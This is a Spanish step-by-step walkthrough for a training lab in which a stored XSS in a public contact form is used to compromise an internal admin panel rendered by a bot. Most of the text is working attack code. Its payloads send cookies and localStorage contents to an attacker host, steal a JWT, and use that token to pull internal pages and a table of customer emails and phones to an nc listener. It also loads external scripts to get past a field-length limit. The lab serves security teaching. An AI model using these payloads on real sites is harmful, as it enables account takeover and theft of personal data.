# Guía paso a paso del laboratorio

Esta guía contiene la secuencia de demostración del laboratorio en español.

## Paso 1: mostrar la aplicación pública

Abre:

```text
http://cross.fit
```

Explica que:

- el entrypoint visible para el usuario es el sitio público
- el formulario de contacto almacena el mensaje enviado
- el código fuente contiene una pista operativa discreta indicando que los mensajes se revisan desde `backend.cross.fit`

## Paso 2: confirmar el aislamiento del backend

Desde la máquina atacante, prueba:

```bash
curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
```

Esperado:

- el atacante no obtiene el panel interno
- la conexión se cierra o devuelve una respuesta no exitosa

Esto deja establecido que `backend.cross.fit` no está disponible de forma directa para el atacante.

## Paso 3: levantar un listener HTTP simple del lado atacante

En la máquina atacante:

```bash
python3 -m http.server 8000
```

Esperado:

- la terminal imprime una línea por cada request recibido
- no hace falta código adicional del lado atacante

## Paso 4: enviar un payload de prueba por el formulario público

Usa un payload que solo haga una request al servidor atacante:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
```

Si atacante y laboratorio están en el mismo host:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
```

Envíalo por el formulario público en `cross.fit` o con `curl`.

## Paso 5: esperar al worker

El worker inicia sesión como admin en `backend.cross.fit`, abre el siguiente mensaje, lo renderiza y luego lo marca como procesado.

Puedes observarlo con:

```bash
docker compose logs -f worker
```

## Paso 6: mostrar la request entrante en el servidor atacante

Esperado en la máquina atacante:

```text
"GET /ping HTTP/1.1" 404 -
```

El `404` es aceptable. Lo importante es que la request llegó al servidor controlado por el atacante.

## Paso 7: explicar la conclusión

En este punto ya puedes afirmar:

- el atacante nunca navegó `backend.cross.fit` directamente
- el formulario público almacenó entrada controlada por el atacante
- la sesión privilegiada del navegador en `backend.cross.fit` ejecutó el payload
- eso alcanza para confirmar que el panel interno es vulnerable a Stored XSS

## Paso 8: preparar un listener manual para el robo de credenciales

Ahora la pregunta es si el navegador privilegiado guarda alguna credencial reutilizable en un storage accesible por JavaScript.

En la máquina atacante:

```bash
python3 -m http.server 8000
```

## Paso 9: intentar robar primero la cookie de sesión

La primera prueba rápida es `document.cookie`, porque el payload es corto y entra cómodo en el formulario público.

Payload:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/collect?c='+encodeURIComponent(document.cookie)">
```

Variación para mismo host:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/collect?c='+encodeURIComponent(document.cookie)">
```

Esperado:

- una request `GET /collect`
- el parámetro `c=` puede venir vacío o sin una credencial útil

Con la arquitectura actual del laboratorio, eso indica que la credencial interesante probablemente no está en una cookie clásica de sesión.

## Paso 10: preparar el escaneo de `localStorage`

El siguiente paso es inspeccionar `localStorage`. La versión inline obvia es:

```html
<script>
for (let i = 0; i < localStorage.length; i += 1) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key) || '';
  new Image().src =
    'http://attacker_machine_ip:8000/collect?key=' +
    encodeURIComponent(key) +
    '&value=' +
    encodeURIComponent(value);
}
</script>
```

Variación para mismo host:

```html
<script>
for (let i = 0; i < localStorage.length; i += 1) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key) || '';
  new Image().src =
    'http://docker_host_gateway_ip:8000/collect?key=' +
    encodeURIComponent(key) +
    '&value=' +
    encodeURIComponent(value);
}
</script>
```

Ese payload ya no entra en el campo `message`, porque está limitado a `250` caracteres.

## Paso 11: mover el escaneo de `localStorage` a un JavaScript externo

Sirve un helper desde la máquina atacante.

Levanta un server estático desde la raíz del repo:

```bash
python3 -m http.server 8000
```

Archivo servido:

```text
tools/payload-localstorage-scan.js
```

Payload mínimo almacenado:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
```

Variación para mismo host:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-localstorage-scan.js"></script>
```

Esperado:

- una o más requests `GET /collect`
- cada request contiene un `key=...` y `value=...`

## Paso 11.1: identificar el valor con forma de JWT

Entre esos valores, busca uno con la estructura típica:

```text
header.payload.signature
```

En este laboratorio eso debería revelar:

- una key de `localStorage` llamada `gym_internal_token`
- un valor que comienza con `eyJ...`

## Paso 12: confirmar el robo del JWT

Una vez conocido el nombre de la key, puedes usar un payload más corto que robe solo el token:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
```

Variación para mismo host:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
```

Esperado:

- una request `GET /collect`
- el parámetro `jwt=eyJ...`

## Paso 13: preparar un listener raw para la siguiente exfiltración

Para el siguiente tramo conviene capturar manualmente el body de una request `POST`.

En la máquina atacante:

```bash
nc -lvnp 9000 | tee raw-http-request.txt
```

Si tu entorno usa `ncat`:

```bash
ncat -lvnp 9000 | tee raw-http-request.txt
```

## Paso 14: pedir la portada de `backend.cross.fit`

La idea ahora es pedir `/` desde el contexto interno y enviar el HTML al listener atacante.

Versión inline de referencia:

```html
<script>
fetch('/')
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

También excede el límite de `250` caracteres, así que en la práctica hay que cargarlo desde un JS externo.

Qué hace cada parte:

- `fetch('/')` pide la portada del origen actual
- `r.text()` lee la respuesta como HTML
- `btoa(unescape(encodeURIComponent(html)))` convierte ese HTML a Base64
- `method: 'POST'` envía el Base64 en el body
- `mode: 'no-cors'` alcanza porque solo importa enviar la request
- `Content-Type: 'text/plain'` hace fácil inspeccionar el body

## Paso 14.1: cargar la portada desde un JavaScript externo

Archivo servido:

```text
tools/payload-frontpage.js
```

Payload mínimo:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js"></script>
```

Variación para mismo host:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage.js"></script>
```

## Paso 15: esperar la request y revisar el raw HTTP

Esperado:

- `POST /internal-html`
- headers HTTP
- una línea en blanco
- el body Base64 al final

## Paso 16: decodificar el Base64 y guardarlo como HTML

```bash
printf '%s' 'BASE64_AQUI' | base64 -d > backend-frontpage.html
```

Luego puedes abrirlo o inspeccionarlo:

```bash
rg -n "<title>|<form|username|password" backend-frontpage.html
```

## Paso 17: validar el resultado esperado

El HTML decodificado debería corresponder al login page de `backend.cross.fit`.

Indicadores esperados:

- título similar a `Acceso interno`
- formulario de login
- `username`
- `password`

## Paso 18: pedir `/` otra vez, ahora enviando el JWT

Ahora repites la request a `/`, pero adjuntando el JWT robado.

Versión inline de referencia:

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

También supera el límite de `250` caracteres, así que aquí también conviene un helper externo.

Archivo servido:

```text
tools/payload-frontpage-with-jwt.js
```

Payload:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
```

Variación para mismo host:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
```

Resultado esperado al decodificar:

- el HTML corresponde al dashboard
- deberían verse indicadores como `Dashboard` y `Ver mensajes`

## Paso 19: pedir `/admin/messages` con el JWT

Desde el dashboard ya puedes ver que existe la acción `Ver mensajes`, apuntando a `/admin/messages`.

Versión inline de referencia:

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/admin/messages', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

También supera el límite de `250` caracteres, por lo que conviene usar un helper externo.

Archivo servido:

```text
tools/payload-messages-with-jwt.js
```

Payload:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js"></script>
```

Variación para mismo host:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-messages-with-jwt.js"></script>
```

Resultado esperado al decodificar:

- el HTML corresponde a `/admin/messages`
- se ve la tabla completa
- aparecen campos como email y teléfono

## Paso 20: pasar luego al collector automatizado

Cuando este flujo manual ya esté claro, puedes continuar con:

```bash
python3 tools/collector.py
```

Desde ahí el collector automatiza:

- recepción de `GET` y `POST`
- impresión del body
- decodificación Base64
- inspección más cómoda de payloads posteriores
